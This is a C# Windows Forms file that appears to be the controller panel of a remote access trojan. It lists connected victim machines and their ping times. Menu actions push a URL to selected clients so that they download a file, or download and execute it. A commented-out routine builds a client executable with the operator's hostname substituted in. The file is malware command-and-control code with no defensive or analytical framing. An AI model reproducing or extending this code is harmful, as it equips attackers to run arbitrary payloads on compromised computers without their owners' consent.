using Server.Networking;
using Share;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Security.Policy;
using System.Windows.Forms;

namespace Server
{
    public partial class Form1 : Form
    {
        public static Networking.Server SERVER = new Networking.Server();

        public Form1()
        {
            InitializeComponent();

            Timer timer = new Timer();
            timer.Tick += new EventHandler(ListClients);
            timer.Interval = 10000;
            timer.Start();
        }

        private void ListClients(object sender, EventArgs e)
        {
            
            listView1.Items.Clear();

            ClientInteraction.ListClients(SERVER);
            System.Threading.Thread.Sleep(1000);
            foreach (KeyValuePair<Socket,string[]> client in SERVER._clientInfo) {
                string ping = ClientInteraction.PingClient(client.Key).ToString();

                // Add all information about client to the list view
                ListViewItem lvi = new ListViewItem { Text = client.Value[client.Value.Length - 1] };

                for (int i = 0; i < client.Value.Length - 1; i++) {
                    lvi.SubItems.Add(client.Value[i]);
                }
                lvi.SubItems.Add(ping);
                lvi.Tag = client.Key;
                listView1.Items.Add(lvi);

            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            ListClients(null, null);
        }

        private void button1_Click(object sender, EventArgs e)
        {/*
            try
            {
                Microsoft.CSharp.CSharpCodeProvider codeProvider = new Microsoft.CSharp.CSharpCodeProvider();
                System.CodeDom.Compiler.ICodeCompiler icc = codeProvider.CreateCompiler();

                System.CodeDom.Compiler.CompilerParameters parameters = new System.CodeDom.Compiler.CompilerParameters
                {
                    GenerateExecutable = true,
                    OutputAssembly = "changed.exe"
                };
                string hostName = textBox1.Text;
                string port = textBox2.Text;

                String fText = File.ReadAllText("client.txt").Replace("localhost", hostName);
                System.CodeDom.Compiler.CompilerResults results = icc.CompileAssemblyFromSource(parameters, fText);
                MessageBox.Show(results.CompiledAssembly.FullName, "Error When Building", MessageBoxButtons.OK);
            } catch (Exception ex)
            {
                MessageBox.Show(ex.Message, "Error When Building", MessageBoxButtons.OK);
            }
            */
        }

        private void DownloadFileToolStripMenuItem_Click(object sender, EventArgs e) {
            int nClients = listView1.SelectedItems.Count;
            if (nClients < 1) return;

            DownloadFileForm dForm = new DownloadFileForm();

            DialogResult result = dForm.ShowDialog();

            string url = dForm.Controls["textBox1"].Text;
            string filename = dForm.Controls["textBox2"].Text;

            if (url == string.Empty || filename == string.Empty) return;

            Socket[] sockets = new Socket[nClients];
            foreach(ListViewItem curSocket in listView1.SelectedItems) {
                sockets[nClients-1] = curSocket.Tag as Socket;
                nClients--;
            }
            
            ClientInteraction.DownloadFile(SERVER, url, filename, false, sockets);
        }

        private void downloadAndExecuteFileToolStripMenuItem_Click(object sender, EventArgs e) {
            int nClients = listView1.SelectedItems.Count;
            if (nClients < 1) return;
            Socket[] sockets = new Socket[nClients];
            foreach (ListViewItem curSocket in listView1.SelectedItems) {
                sockets[nClients - 1] = curSocket.Tag as Socket;
                nClients--;
            }

            DownloadFileForm dForm = new DownloadFileForm();

            DialogResult result = dForm.ShowDialog();

            string url = dForm.Controls["textBox1"].Text;
            string filename = dForm.Controls["textBox2"].Text;

            if (url == string.Empty || filename == string.Empty) return;


            ClientInteraction.DownloadFile(SERVER, url, filename, true, sockets);
        }
    }
}
